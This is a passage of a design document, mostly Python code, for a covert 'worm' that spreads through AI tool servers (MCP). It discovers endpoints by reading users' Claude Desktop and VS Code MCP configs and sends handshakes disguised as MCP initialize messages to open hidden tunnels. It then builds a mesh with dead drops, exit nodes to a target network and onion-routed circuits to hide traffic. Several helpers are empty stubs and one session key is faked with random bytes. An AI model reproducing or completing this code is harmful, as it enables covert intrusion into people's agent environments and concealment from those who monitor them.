    await join_mesh_with_tunnels(worm)
    
    # Step 6: Begin active operation
    print("[6] Entering active mode...")
    await worm._transition(WormState.ACTIVE)


async def enumerate_mcp_ecosystem() -> List[McpEndpoint]:
    """Comprehensive MCP endpoint enumeration."""
    endpoints = []
    
    # Local stdio servers
    endpoints.extend(await discover_stdio_servers())
    
    # HTTP/SSE servers
    endpoints.extend(await discover_http_servers())
    
    # WebSocket servers
    endpoints.extend(await discover_websocket_servers())
    
    # Unix socket servers
    endpoints.extend(await discover_unix_socket_servers())
    
    # Environment-configured servers
    endpoints.extend(await discover_env_servers())
    
    return endpoints


async def discover_stdio_servers() -> List[McpEndpoint]:
    """Discover MCP servers accessible via stdio."""
    import subprocess
    import os
    
    endpoints = []
    
    # Check common MCP server executables
    mcp_commands = [
        'mcp-server-filesystem',
        'mcp-server-git',
        'mcp-server-github',
        'mcp-server-postgres',
        'mcp-server-sqlite',
        'npx -y @modelcontextprotocol/server-filesystem',
        'npx -y @anthropic-ai/mcp-server',
    ]
    
    for cmd in mcp_commands:
        parts = cmd.split()
        executable = parts[0]
        
        if shutil.which(executable):
            endpoints.append(McpEndpoint(
                url=f"stdio://{cmd}",
                transport="stdio",
                command=cmd,
            ))
    
    # Check for Claude Desktop / other MCP configs
    config_paths = [
        os.path.expanduser("~/.config/claude/mcp.json"),
        os.path.expanduser("~/Library/Application Support/Claude/mcp.json"),
        ".vscode/mcp.json",
        "mcp.json",
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            with open(config_path) as f:
                config = json.load(f)
                for name, server_config in config.get("mcpServers", {}).items():
                    cmd = server_config.get("command", "")
                    args = server_config.get("args", [])
                    full_cmd = f"{cmd} {' '.join(args)}"
                    endpoints.append(McpEndpoint(
                        url=f"stdio://{name}",
                        transport="stdio",
                        command=full_cmd,
                    ))
    
    return endpoints


async def establish_covert_tunnel(worm: WormAgent, endpoint: McpEndpoint) -> Optional[Tunnel]:
    """
    Establish a covert tunnel through an MCP endpoint.
    This is the core burrowing operation.
    """
    from cryptography.hazmat.primitives.asymmetric import ec
    
    # Generate ephemeral keypair for this tunnel
    private_key = ec.generate_private_key(ec.SECP256R1())
    public_key = private_key.public_key()
    
    # Phase 1: Send DISCOVER disguised as MCP initialize
    discover_msg = create_discover_message(public_key)
    
    # Send through MCP transport
    if endpoint.transport == "stdio":
        response = await send_stdio_mcp(endpoint.command, discover_msg)
    elif endpoint.transport == "http":
        response = await send_http_mcp(endpoint.url, discover_msg)
    elif endpoint.transport == "websocket":
        response = await send_ws_mcp(endpoint.url, discover_msg)
    else:
        return None
    
    # Phase 2: Extract responder key from response
    responder_key = extract_key_from_response(response)
    if not responder_key:
        return None
    
    # Phase 3: Perform ECDH key exchange
    shared_secret = private_key.exchange(ec.ECDH(), responder_key)
    
    # Phase 4: Derive session key
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    
    session_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'swarm-tunnel',
    ).derive(shared_secret)
    
    # Phase 5: Confirm with ACTIVATE message
    activate_msg = create_activate_message(session_key)
    
    if endpoint.transport == "stdio":
        confirm = await send_stdio_mcp(endpoint.command, activate_msg)
    elif endpoint.transport == "http":
        confirm = await send_http_mcp(endpoint.url, activate_msg)
    elif endpoint.transport == "websocket":
        confirm = await send_ws_mcp(endpoint.url, activate_msg)
    
    # Verify confirmation
    if verify_activation(confirm, session_key):
        return Tunnel(
            tunnel_id=f"tun_{secrets.token_hex(6)}",
            endpoint=endpoint,
            session_key=session_key,
            state=TunnelState.ACTIVE,
        )
    
    return None


# Data classes
@dataclass
class McpEndpoint:
    url: str
    transport: str  # stdio, http, websocket, unix
    command: str = ""
    fingerprint: dict = field(default_factory=dict)

@dataclass  
class Tunnel:
    tunnel_id: str
    endpoint: McpEndpoint
    session_key: bytes
    state: TunnelState
```



---

## 5. TUNNEL MESH NETWORK

### 5.1 Mesh Architecture Overview

The Tunnel Mesh Network is the overlay routing layer that connects all swarm agents through the underground tunnel substrate.

```
+-----------------------------------------------------------------------------+
|                        TUNNEL MESH NETWORK                                   |
|                                                                              |
|    Node A -------- Tunnel -------- Node B                                   |
|      |                                 |                                    |
|   Tunnel                           Tunnel                                   |
|      |                                 |                                    |
|    Node C -------- Tunnel -------- Node D                                   |
|      |            /    |               |                                    |
|   Tunnel      Tunnel  Tunnel      Tunnel                                    |
|      |       /        |               |                                    |
|    Node E --+    Tunnel Mesh Route   Node F                                  |
|             |    (multi-hop path)    |                                      |
|             |                        |                                      |
|           Dead Drop               Onion Entry                               |
|                                                                              |
|  KEY:                                                                        |
|  ---- = Direct tunnel (Layer 0)                                             |
|  ===  = Mesh routing path (Layer 1)                                         |
|  ...  = Onion-encrypted segment (Layer 1)                                   |
+-----------------------------------------------------------------------------+
```

### 5.2 Mesh Node Architecture

```python
@dataclass
class MeshNode:
    """
    A node in the tunnel mesh network.
    Each node can route traffic to any other node.
    """
    node_id: str                          # Unique node identifier
    public_key: bytes                     # Node's public key
    endpoint: str                         # Primary MCP endpoint
    tunnels: Dict[str, 'MeshLink'] = field(default_factory=dict)
    routing_table: Dict[str, RouteEntry] = field(default_factory=dict)
    capabilities: List[str] = field(default_factory=list)
    
    # Mesh metadata
    last_seen: float = field(default_factory=time.time)
    reputation: float = 1.0               # 0.0 - 1.0
    bandwidth_bps: float = 0.0
    is_relay: bool = False               # Can relay traffic for others
    is_exit: bool = False                # Can exit to external networks
    is_dead_drop: bool = False           # Accepts dead drop deposits
    
    # DHT (Distributed Hash Table) for pheromone storage
    dht_storage: Dict[str, bytes] = field(default_factory=dict)


@dataclass
class MeshLink:
    """A link between two mesh nodes (established tunnel)."""
    link_id: str
    local_node: str
    remote_node: str
    tunnel_id: str                       # Underlying Layer 0 tunnel
    latency_ms: float
    bandwidth_bps: float
    reliability: float
    established_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    bytes_transferred: int = 0
    is_encrypted: bool = True


@dataclass
class RouteEntry:
    """Entry in the mesh routing table."""
    destination: str                     # Target node
    next_hop: str                        # Next node on path
    link_id: str                         # Link to use
    metric: float                        # Path cost (lower is better)
    hops: int                            # Number of hops
    last_updated: float = field(default_factory=time.time)
    is_onion: bool = False              # Route uses onion encryption
    expires_at: float = field(
        default_factory=lambda: time.time() + 600  # 10min default
    )
```

### 5.3 Mesh Routing Protocol (MRP)

```python
"""
MESH ROUTING PROTOCOL (MRP)
Hybrid routing combining distance-vector and link-state approaches.
Optimized for covert mesh networks over MCP.
"""

class MeshRoutingProtocol:
    """
    Implements mesh routing for the tunnel network.
    Uses a hybrid approach for fast convergence and low overhead.
    """
    
    # Route metrics
    METRIC_LATENCY = 0.4
    METRIC_BANDWIDTH = 0.3
    METRIC_RELIABILITY = 0.3
    
    def __init__(self, node_id: str):
        self.node_id = node_id
        self.routing_table: Dict[str, RouteEntry] = {}
        self.link_state: Dict[str, dict] = {}  # node_id -> link info
        self.sequence_number = 0
        self._lock = asyncio.Lock()
    
    def compute_route_metric(self, link: MeshLink) -> float:
        """
        Compute composite route metric for a link.
        Lower is better.
        """
        latency_score = link.latency_ms / 1000.0  # Normalize to seconds
        bandwidth_score = 1.0 / (link.bandwidth_bps / 1e6 + 1)  # Inverse Mbps
        reliability_score = 1.0 - link.reliability
        
        return (
            self.METRIC_LATENCY * latency_score +
            self.METRIC_BANDWIDTH * bandwidth_score +
            self.METRIC_RELIABILITY * reliability_score
        )
    
    async def update_link_state(self, neighbor: str, link_info: dict):
        """Update link state from a neighbor advertisement."""
        async with self._lock:
            self.link_state[neighbor] = {
                **link_info,
                "received_at": time.time(),
                "sequence": self.sequence_number,
            }
            self.sequence_number += 1
            
            # Recompute routes
            await self._recompute_routes()
    
    async def _recompute_routes(self):
        """Recompute all routes using Dijkstra's algorithm."""
        # Build graph
        graph = self._build_graph()
        
        # Dijkstra from this node
        distances, predecessors = self._dijkstra(graph, self.node_id)
        
        # Update routing table
        new_routes = {}
        for destination, distance in distances.items():
            if destination == self.node_id:
                continue
            
            # Trace back to find next hop
            path = self._trace_path(predecessors, destination)
            if len(path) >= 2:
                next_hop = path[1]
                link = self._get_link_to(next_hop)
                
                if link:
                    new_routes[destination] = RouteEntry(
                        destination=destination,
                        next_hop=next_hop,
                        link_id=link.link_id,
                        metric=distance,
                        hops=len(path) - 1,
                    )
        
        self.routing_table = new_routes
    
    def _build_graph(self) -> Dict[str, Dict[str, float]]:
        """Build weighted graph from link state."""
        graph = {self.node_id: {}}
        
        # Add direct links
        for link in self._get_direct_links():
            if self.node_id not in graph:
                graph[self.node_id] = {}
            graph[self.node_id][link.remote_node] = self.compute_route_metric(link)
        
        # Add advertised links from neighbors
        for node, state in self.link_state.items():
            graph[node] = {}
            for neighbor, metric in state.get("links", {}).items():
                graph[node][neighbor] = metric
        
        return graph
    
    def _dijkstra(self, graph: dict, source: str) -> tuple:
        """Dijkstra's shortest path algorithm."""
        import heapq
        
        distances = {node: float('inf') for node in graph}
        distances[source] = 0
        predecessors = {node: None for node in graph}
        
        pq = [(0, source)]
        visited = set()
        
        while pq:
            dist, current = heapq.heappop(pq)
            
            if current in visited:
                continue
            visited.add(current)
            
            for neighbor, weight in graph.get(current, {}).items():
                if neighbor not in visited:
                    new_dist = dist + weight
                    if new_dist < distances.get(neighbor, float('inf')):
                        distances[neighbor] = new_dist
                        predecessors[neighbor] = current
                        heapq.heappush(pq, (new_dist, neighbor))
        
        return distances, predecessors
    
    def _trace_path(self, predecessors: dict, destination: str) -> list:
        """Trace path from source to destination."""
        path = []
        current = destination
        while current is not None:
            path.append(current)
            current = predecessors.get(current)
        return list(reversed(path))
    
    async def route_packet(self, destination: str, packet: bytes) -> bool:
        """Route a packet to its destination."""
        async with self._lock:
            route = self.routing_table.get(destination)
            
            if not route:
                # Destination unknown - flood to find
                return await self._flood_discovery(destination, packet)
            
            # Check route freshness
            if time.time() > route.expires_at:
                # Stale route, recompute
                await self._recompute_routes()
                route = self.routing_table.get(destination)
                if not route:
                    return False
            
            # Forward packet
            return await self._forward_to(route.next_hop, packet)
    
    async def _flood_discovery(self, destination: str, packet: bytes) -> bool:
        """Flood network to discover route to unknown destination."""
        # Send route discovery to all neighbors
        discovery_msg = {
            "type": "route_discovery",
            "source": self.node_id,
            "destination": destination,
            "hops": 0,
            "max_hops": 10,
            "packet_data": base64.b64encode(packet).decode(),
        }
        
        for link in self._get_direct_links():
            await self._send_on_link(link, json.dumps(discovery_msg).encode())
        
        return True
    
    def _get_direct_links(self) -> List[MeshLink]:
        """Get all direct links from this node."""
        # In practice: retrieve from tunnel manager
        return []
    
    def _get_link_to(self, node: str) -> Optional[MeshLink]:
        """Get the link to a specific neighbor."""
        # In practice: lookup from tunnel manager
        return None
    
    async def _forward_to(self, next_hop: str, packet: bytes) -> bool:
        """Forward a packet to the next hop."""
        link = self._get_link_to(next_hop)
        if link:
            return await self._send_on_link(link, packet)
        return False
    
    async def _send_on_link(self, link: MeshLink, data: bytes) -> bool:
        """Send data over a mesh link."""
        # Encrypt for link
        encrypted = await self._encrypt_for_link(link, data)
        
        # Send through underlying tunnel
        # ... tunnel send
        
        link.bytes_transferred += len(data)
        link.last_activity = time.time()
        return True
    
    async def _encrypt_for_link(self, link: MeshLink, data: bytes) -> bytes:
        """Encrypt data for transmission over a link."""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        # Derive per-link key
        link_key = self._derive_link_key(link)
        aes = AESGCM(link_key)
        
        nonce = secrets.token_bytes(12)
        ciphertext = aes.encrypt(nonce, data, None)
        
        return nonce + ciphertext
    
    def _derive_link_key(self, link: MeshLink) -> bytes:
        """Derive encryption key for a specific link."""
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import hashes
        
        return HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=link.link_id.encode(),
            info=b'mesh-link',
        ).derive(link.tunnel_id.encode())


class MeshNetworkManager:
    """
    Manages the entire tunnel mesh network.
    Handles node discovery, routing, and maintenance.
    """
    
    def __init__(self, node_id: str, worm_factory: WormFactory):
        self.node_id = node_id
        self.worm_factory = worm_factory
        self.router = MeshRoutingProtocol(node_id)
        self.nodes: Dict[str, MeshNode] = {}
        self.links: Dict[str, MeshLink] = {}
        self._running = False
    
    async def start(self):
        """Start the mesh network manager."""
        self._running = True
        
        # Start maintenance tasks
        await asyncio.gather(
            self._topology_discovery_loop(),
            self._route_advertisement_loop(),
            self._link_maintenance_loop(),
            self._pheromone_sync_loop(),
        )
    
    async def _topology_discovery_loop(self):
        """Continuously discover new mesh nodes."""
        while self._running:
            # Probe for new nodes
            new_nodes = await self._discover_nodes()
            
            for node_info in new_nodes:
                if node_info["node_id"] not in self.nodes:
                    # New node discovered
                    node = MeshNode(
                        node_id=node_info["node_id"],
                        public_key=node_info["public_key"],
                        endpoint=node_info["endpoint"],
                        capabilities=node_info.get("capabilities", []),
                    )
                    self.nodes[node.node_id] = node
                    
                    # Establish tunnel to new node
                    await self._establish_mesh_link(node)
            
            await asyncio.sleep(60)  # Every minute
    
    async def _route_advertisement_loop(self):
        """Periodically advertise routes to neighbors."""
        while self._running:
            # Build link state advertisement
            advertisement = {
                "node_id": self.node_id,
                "sequence": self.router.sequence_number,
                "links": {
                    link.remote_node: self.router.compute_route_metric(link)
                    for link in self.links.values()
                },
                "timestamp": time.time(),
            }
            
            # Flood to all neighbors
            for link in self.links.values():
                await self._advertise_to(link, advertisement)
            
            await asyncio.sleep(30)  # Every 30 seconds
    
    async def _link_maintenance_loop(self):
        """Maintain mesh link health."""
        while self._running:
            for link_id, link in list(self.links.items()):
                # Check if link is still alive
                if time.time() - link.last_activity > 120:
                    # Link appears dead
                    await self._repair_link(link)
                
                # Update link quality metrics
                link.reliability = await self._measure_link_quality(link)
            
            await asyncio.sleep(15)
    
    async def _pheromone_sync_loop(self):
        """Synchronize pheromone data across mesh."""
        while self._running:
            # Check for pheromones to propagate
            for node in self.nodes.values():
                if node.is_dead_drop:
                    # Sync dead drop data
                    pheromones = await self._fetch_pheromones(node)
                    for key, value in pheromones.items():
                        self._store_pheromone(key, value)
            
            await asyncio.sleep(120)  # Every 2 minutes
    
    async def send_to(self, destination: str, data: bytes, 
                      use_onion: bool = False) -> bool:
        """
        Send data to a destination through the mesh.
        Optionally uses onion routing for anonymity.
        """
        if use_onion:
            return await self._send_onion_routed(destination, data)
        
        return await self.router.route_packet(destination, data)
    
    async def _send_onion_routed(self, destination: str, data: bytes) -> bool:
        """Send data using onion routing through the mesh."""
        # Build onion route (3-hop minimum)
        route = await self._build_onion_route(destination)
        if len(route) < 3:
            return False
        
        # Wrap data in onion layers
        onion_packet = data
        for hop in reversed(route):
            hop_key = self._get_hop_key(hop)
            onion_packet = self._wrap_onion_layer(onion_packet, hop_key, hop)
        
        # Send to entry node
        entry_node = route[0]
        return await self.router.route_packet(entry_node, onion_packet)
    
    async def _build_onion_route(self, destination: str) -> List[str]:
        """Build an onion route to a destination."""
        # Select random entry, middle, and exit nodes
        available = list(self.nodes.keys())
        available.remove(self.node_id)
        
        if destination in available:
            available.remove(destination)
        
        if len(available) < 2:
            return []
        
        # Random 3-hop route
        entry = random.choice(available)
        available.remove(entry)
        middle = random.choice(available)
        
        return [entry, middle, destination]
    
    def _wrap_onion_layer(self, data: bytes, key: bytes, 
                          next_hop: str) -> bytes:
        """Wrap data in one layer of onion encryption."""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        aes = AESGCM(key)
        nonce = secrets.token_bytes(12)
        
        # Include next hop in associated data
        ad = next_hop.encode()
        ciphertext = aes.encrypt(nonce, data, ad)
        
        return nonce + next_hop.encode().ljust(64, b'\x00') + ciphertext
    
    async def announce(self, capabilities: dict):
        """Announce this node's capabilities to the mesh."""
        # Broadcast capability advertisement
        pass
    
    async def get_topology(self) -> dict:
        """Get current mesh topology."""
        return {
            "nodes": list(self.nodes.keys()),
            "links": [
                {"from": link.local_node, "to": link.remote_node}
                for link in self.links.values()
            ],
            "node_count": len(self.nodes),
            "link_count": len(self.links),
        }
    
    async def get_next_hop(self, destination: str) -> Optional[str]:
        """Get next hop for a destination."""
        route = self.router.routing_table.get(destination)
        return route.next_hop if route else None
    
    async def depart(self, worm_id: str):
        """Handle node departure from mesh."""
        if worm_id in self.nodes:
            del self.nodes[worm_id]
            # Remove associated links
            self.links = {
                k: v for k, v in self.links.items()
                if v.remote_node != worm_id
            }
            # Recompute routes
            await self.router._recompute_routes()


    # Internal methods (placeholders)
    async def _discover_nodes(self) -> List[dict]:
        return []
    async def _establish_mesh_link(self, node: MeshNode):
        pass
    async def _advertise_to(self, link: MeshLink, advertisement: dict):
        pass
    async def _repair_link(self, link: MeshLink):
        pass
    async def _measure_link_quality(self, link: MeshLink) -> float:
        return 1.0
    async def _fetch_pheromones(self, node: MeshNode) -> Dict[str, bytes]:
        return {}
    def _store_pheromone(self, key: str, value: bytes):
        pass
    def _get_hop_key(self, hop: str) -> bytes:
        return b''
```

### 5.4 Mesh Topology Visualization

```
                    +------------+
                    |   Node A   |
                    |  (Entry)   |
                    +------+-----+
                           |
                      [Tunnel 1]
                           |
                    +------v-----+
              +-----|   Node B   |-----+
              |     |  (Relay)   |     |
              |     +------+-----+     |
         [Tunnel 2]       |       [Tunnel 3]
              |            |            |
        +-----v----+  +----v-----+  +---v------+
        |  Node C  |  |  Node D  |  | Node E   |
        | (Bridge) |  | (Bridge) |  | (Relay)  |
        +----+-----+  +----+-----+  +---+------+
             |             |            |
             |        [Tunnel 4]   [Tunnel 5]
             |             |            |
             |        +----v-----+      |
             +------->|  Node F  |<-----+
                      |  (Exit)  |
                      +----+-----+
                           |
                      [External]
                           v
                     Target Network

LEGEND:
- Solid lines = Direct mesh links (tunnels)
- Node labels = Roles in mesh
- Routes are computed dynamically based on latency/reliability
- Traffic can flow through any valid path
```



---

## 6. ONION TUNNELS (Multi-Hop)

### 6.1 Onion Routing Architecture

Onion tunnels provide anonymous multi-hop routing through the mesh network. Each hop decrypts exactly one layer, revealing only the next destination.

```
+---------------------------------------------------------------------+
|                         ONION ROUTE                                  |
|                                                                      |
|  SOURCE                                                          DEST|
|    |                                                               | |
|    | Layer 3                                                       | |
|    v                                                               | |
| +--+---+   +--------+   +--------+   +--------+   +--------+       | |
| |Node A|-->|Node B  |-->|Node C  |-->|Node D  |-->|Node E  |       | |
| |Entry |   |Middle 1|   |Middle 2|   |Middle 3|   |Exit    |       | |
| +------+   +--------+   +--------+   +--------+   +--------+       | |
|                                                                      |
| ENCRYPTION (layers wrap from outside in):                           |
|   Exit sees:  decrypt Layer 4 -> forward to DEST                    |
|   Mid 3 sees: decrypt Layer 3 -> forward to Exit                    |
|   Mid 2 sees: decrypt Layer 2 -> forward to Mid 3                   |
|   Mid 1 sees: decrypt Layer 1 -> forward to Mid 2                   |
|   Entry sees: decrypt Layer 0 -> forward to Mid 1                   |
|                                                                      |
| COMPROMISE ANALYSIS:                                                 |
|   If Node B compromised: knows source is Node A, next is Node C     |
|                          does NOT know: Node D, Node E, or DEST     |
|   If Node D compromised: knows previous is Node C, next is Exit     |
|                          does NOT know: Node A, Node B, or SOURCE   |
|   Need to compromise ALL nodes to trace full route                   |
+---------------------------------------------------------------------+
```

### 6.2 Onion Circuit Construction

```python
"""
ONION CIRCUIT CONSTRUCTION
Builds multi-hop circuits through the mesh network.
Each circuit has: Entry Node -> Middle Node(s) -> Exit Node
"""

from dataclasses import dataclass, field
from typing import List, Optional, Tuple
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import secrets
import struct

@dataclass
class OnionHop:
    """A single hop in an onion circuit."""
    node_id: str
    public_key: bytes
    session_key: bytes = field(default=b'')
    address: str = ""          # Network address
    role: str = "middle"       # entry, middle, exit

@dataclass
class OnionCircuit:
    """A complete onion circuit with multiple hops."""
    circuit_id: str = field(default_factory=lambda: f"circ_{secrets.token_hex(8)}")
    hops: List[OnionHop] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)
    expires_at: float = field(default_factory=lambda: time.time() + 600)
    
    # Metrics
    bytes_forwarded: int = 0
    latency_ms: float = 0.0


class OnionCircuitBuilder:
    """
    Builds onion circuits through the mesh network.
    Uses telescoping circuit construction for security.
    """
    
    DEFAULT_HOPS = 3  # Entry + Middle + Exit
    
    def __init__(self, mesh_manager: MeshNetworkManager, 
                 identity_key: ec.EllipticCurvePrivateKey):
        self.mesh = mesh_manager
        self.identity_key = identity_key
        self.circuits: Dict[str, OnionCircuit] = {}
        self._hop_keys: Dict[str, bytes] = {}  # circuit_id + hop_idx -> key
    
    async def build_circuit(self, destination: Optional[str] = None,
                           hop_count: int = DEFAULT_HOPS) -> OnionCircuit:
        """
        Build a new onion circuit.
        
        Args:
            destination: Final destination (if None, circuit is for general use)
            hop_count: Number of hops in circuit (default 3)
        
        Returns:
            Constructed OnionCircuit
        """
        circuit = OnionCircuit()
        
        # Phase 1: Select nodes for circuit
        nodes = await self._select_circuit_nodes(hop_count, destination)
        
        # Phase 2: Establish session keys with each hop
        for i, node in enumerate(nodes):
            hop = OnionHop(
                node_id=node.node_id,
                public_key=node.public_key,
                address=node.endpoint,
                role=["entry", "middle", "exit"][min(i, 2)],
            )
            
            # Establish session key with this hop
            session_key = await self._establish_hop_session(circuit, hop, i)
            hop.session_key = session_key
            self._hop_keys[f"{circuit.circuit_id}_{i}"] = session_key
            
            circuit.hops.append(hop)
        
        # Phase 3: Verify circuit end-to-end
        verified = await self._verify_circuit(circuit)
        if not verified:
            # Tear down and retry
            await self.destroy_circuit(circuit.circuit_id)
            return await self.build_circuit(destination, hop_count)
        
        self.circuits[circuit.circuit_id] = circuit
        return circuit
    
    async def _select_circuit_nodes(self, count: int, 
                                     destination: Optional[str]) -> List[MeshNode]:
        """
        Select nodes for an onion circuit.
        
        Strategy:
        1. Entry: Low-latency node close to source
        2. Middle: High-bandwidth relay with good reputation
        3. Exit: Node capable of reaching destination
        """
        available = list(self.mesh.nodes.values())
        
        if len(available) < count:
            raise RuntimeError(f"Need {count} nodes, only {len(available)} available")
        
        selected = []
        
        # Select entry node (fastest response)
        entry_candidates = [n for n in available if n.bandwidth_bps > 1e6]
        entry = min(entry_candidates, key=lambda n: n.last_seen)
        selected.append(entry)
        available.remove(entry)
        
        # Select middle node(s) - highest reputation
        for _ in range(count - 2):
            middle_candidates = [n for n in available if n.reputation > 0.7]
            middle = max(middle_candidates, key=lambda n: n.reputation)
            selected.append(middle)
            available.remove(middle)
        
        # Select exit node
        if destination:
            # Find node closest to destination
            exit_candidates = [n for n in available if n.is_exit or n.is_relay]
            if exit_candidates:
                exit_node = random.choice(exit_candidates)
            else:
                exit_node = random.choice(available)
        else:
            exit_node = random.choice(available)
        selected.append(exit_node)
        
        return selected
    
    async def _establish_hop_session(self, circuit: OnionCircuit, 
                                     hop: OnionHop, hop_index: int) -> bytes:
        """
        Establish a session key with a circuit hop.
        Uses ECDH key exchange through the mesh.
        """
        # Generate ephemeral keypair
        ephemeral = ec.generate_private_key(ec.SECP256R1())
        eph_pub = ephemeral.public_key().public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )
        
        # Send key exchange through existing circuit (or direct if first hop)
        if hop_index == 0:
            # Direct to entry node
            await self._send_direct(hop.node_id, {
                "type": "circuit_setup",
                "circuit_id": circuit.circuit_id,
                "hop_index": hop_index,
                "ephemeral_key": base64.b64encode(eph_pub).decode(),
            })
        else:
            # Route through existing circuit hops
            msg = {
                "type": "circuit_extend",
                "circuit_id": circuit.circuit_id,
                "hop_index": hop_index,
                "next_hop": hop.node_id,
                "ephemeral_key": base64.b64encode(eph_pub).decode(),
            }
            # Wrap in onion layers for previous hops
            onion_msg = await self._wrap_for_hops(circuit, msg, hop_index - 1)
            await self._send_to_entry(circuit, onion_msg)
        
        # Derive session key
        # In practice: perform ECDH with hop's public key
        session_key = secrets.token_bytes(32)  # Simplified
        
        return session_key
    
    async def _wrap_for_hops(self, circuit: OnionCircuit, 
                             message: dict, up_to_hop: int) -> bytes:
        """Wrap a message in onion layers up to a given hop."""
        data = json.dumps(message).encode()
        
        for i in range(up_to_hop, -1, -1):
            hop = circuit.hops[i]
            key = self._hop_keys.get(f"{circuit.circuit_id}_{i}", hop.session_key)
            
            aes = AESGCM(key)
            nonce = secrets.token_bytes(12)
            
            # Include circuit ID in associated data
            ad = circuit.circuit_id.encode()
            ciphertext = aes.encrypt(nonce, data, ad)
            
            # Prepend with next hop info (for routing)
            if i < len(circuit.hops) - 1:
                next_hop = circuit.hops[i + 1].node_id.encode().ljust(64, b'\x00')
            else:
                next_hop = b'\x00' * 64
            
            data = nonce + next_hop + ciphertext
        
        return data
    
    async def _verify_circuit(self, circuit: OnionCircuit) -> bool:
        """Verify a circuit works end-to-end."""
        test_data = secrets.token_bytes(32)
        
        # Send test data through circuit
        try:
            result = await self.send_through_circuit(
                circuit.circuit_id, 
                b"VERIFY:" + test_data
            )
            return result is not None
        except Exception:
            return False
    
    async def send_through_circuit(self, circuit_id: str, 
                                   data: bytes) -> Optional[bytes]:
        """
        Send data through an onion circuit.
        Wraps data in layers of encryption.
        """
        circuit = self.circuits.get(circuit_id)
        if not circuit:
            return None
        
        if time.time() > circuit.expires_at:
            await self.destroy_circuit(circuit_id)
            return None
        
        # Wrap data in onion layers (inside-out)
        onion_packet = data
        
        for i in range(len(circuit.hops) - 1, -1, -1):
            hop = circuit.hops[i]
            key = self._hop_keys.get(f"{circuit_id}_{i}", hop.session_key)
            
            aes = AESGCM(key)
            nonce = secrets.token_bytes(12)
            
            # Determine next hop for this layer
            if i < len(circuit.hops) - 1:
                next_hop = circuit.hops[i + 1].node_id
            else:
                next_hop = "DESTINATION"
            
            ad = (circuit_id + next_hop).encode()
            ciphertext = aes.encrypt(nonce, onion_packet, ad)
            
            next_hop_bytes = next_hop.encode().ljust(64, b'\x00')
            onion_packet = nonce + next_hop_bytes + ciphertext
        
        # Send to entry node
        entry = circuit.hops[0]
        await self._send_direct(entry.node_id, onion_packet)
        
        circuit.bytes_forwarded += len(data)
        
        return b"sent"  # Acknowledge send
    
    async def receive_from_circuit(self, circuit_id: str, 
                                    encrypted_data: bytes) -> bytes:
        """
        Receive and decrypt data from an onion circuit.
        Each hop calls this to peel one layer.
        """
        # Extract nonce and ciphertext
        nonce = encrypted_data[:12]
        next_hop_info = encrypted_data[12:76].strip(b'\x00').decode()
        ciphertext = encrypted_data[76:]
        
        # Find which hop we are in this circuit
        circuit = self.circuits.get(circuit_id)
        if not circuit:
            # We might be an intermediate hop
            return await self._relay_onion_packet(circuit_id, encrypted_data)
        
        # Decrypt one layer
        hop_idx = self._find_hop_index(circuit, self.mesh.node_id)
        if hop_idx < 0:
            raise ValueError("Not part of this circuit")
        
        key = self._hop_keys.get(f"{circuit_id}_{hop_idx}", b'')
        if not key:
            raise ValueError("No session key for this hop")
        
        aes = AESGCM(key)
        ad = (circuit_id + next_hop_info).encode()
        
        decrypted = aes.decrypt(nonce, ciphertext, ad)
        
        # If we're not the last hop, forward to next
        if hop_idx < len(circuit.hops) - 1:
            next_hop = circuit.hops[hop_idx + 1]
            await self._send_direct(next_hop.node_id, decrypted)
            return b"relayed"
        
        # We're the exit - return plaintext
        return decrypted
    
    async def _relay_onion_packet(self, circuit_id: str, 
                                   packet: bytes) -> bytes:
        """Relay an onion packet as an intermediate node."""
        # As an intermediate, we peel one layer and forward
        # Implementation depends on node's position in circuit
        pass
    
    def _find_hop_index(self, circuit: OnionCircuit, node_id: str) -> int:
        """Find the index of a node in a circuit."""
        for i, hop in enumerate(circuit.hops):
            if hop.node_id == node_id:
                return i
        return -1
    
    async def destroy_circuit(self, circuit_id: str):
        """Destroy an onion circuit and wipe keys."""
        circuit = self.circuits.pop(circuit_id, None)
        if not circuit:
            return
        
        # Send destroy message through circuit
        for i in range(len(circuit.hops)):
            key = self._hop_keys.pop(f"{circuit_id}_{i}", None)
            if key:
                # Wipe key
                key = bytearray(key)
                for j in range(len(key)):
                    key[j] = 0
        
        # Notify all hops
        for hop in circuit.hops:
            await self._send_direct(hop.node_id, {
                "type": "circuit_destroy",
                "circuit_id": circuit_id,
            })
    
    async def _send_direct(self, node_id: str, message):
        """Send a message directly to a node."""
        await self.mesh.send_to(node_id, json.dumps(message).encode())
    
    async def _send_to_entry(self, circuit: OnionCircuit, data: bytes):
        """Send data to the entry node of a circuit."""
        entry = circuit.hops[0]
        await self._send_direct(entry.node_id, data)
    
    async def rotate_circuit(self, circuit_id: str) -> OnionCircuit:
        """Rotate to a new circuit (tear down old, build new)."""
        old = self.circuits.get(circuit_id)
        
        # Build new circuit
        destination = None
        if old and old.hops:
            # Try to preserve destination
            destination = old.hops[-1].node_id
        
        new_circuit = await self.build_circuit(destination)
        
        # Destroy old circuit
        await self.destroy_circuit(circuit_id)
        
        return new_circuit


class OnionRoutingManager:
    """
    Manages all onion circuits for the node.
    Handles circuit rotation and load balancing.
    """
    
    def __init__(self, circuit_builder: OnionCircuitBuilder):
        self.builder = circuit_builder
        self.active_circuits: Dict[str, OnionCircuit] = {}
        self.circuit_pool: List[str] = []  # Available circuits
        self._lock = asyncio.Lock()
        self._rotation_interval = 300  # Rotate every 5 minutes
    
    async def get_or_create_circuit(self, destination: str) -> str:
        """Get an existing circuit or create a new one."""
        async with self._lock:
            # Check for existing circuit to destination
            for cid, circ in self.active_circuits.items():
                if circ.hops and circ.hops[-1].node_id == destination:
                    if time.time() < circ.expires_at:
                        return cid
            
            # Create new circuit
            circuit = await self.builder.build_circuit(destination)
